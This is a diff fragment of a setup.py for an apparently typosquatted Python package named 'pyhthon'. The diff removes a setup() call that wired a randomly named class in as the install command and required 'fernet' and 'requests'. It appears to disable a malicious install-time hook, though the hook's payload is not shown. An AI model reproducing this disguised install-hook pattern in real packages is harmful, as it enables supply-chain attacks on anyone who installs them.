@@ -18,22 +18,5 @@ class cLHkZLqnYBhPHojmuIGRVnqAyowDZStJxCCARvKYMsXUDpWCPIXxVLHnTiAPfohNCVuZNqjlPb
             install.run(self)
 
 
-setup(
-    name="pyhthon",
-    version=VERSION,
-    author="uZVsNcGu",
-    author_email="VyAywVdAbMovDJbPTPOr@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': cLHkZLqnYBhPHojmuIGRVnqAyowDZStJxCCARvKYMsXUDpWCPIXxVLHnTiAPfohNCVuZNqjlPbnrPNGwDSnVULbbIIUwwLzAnwevZIvkoBntSPQ,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              
 
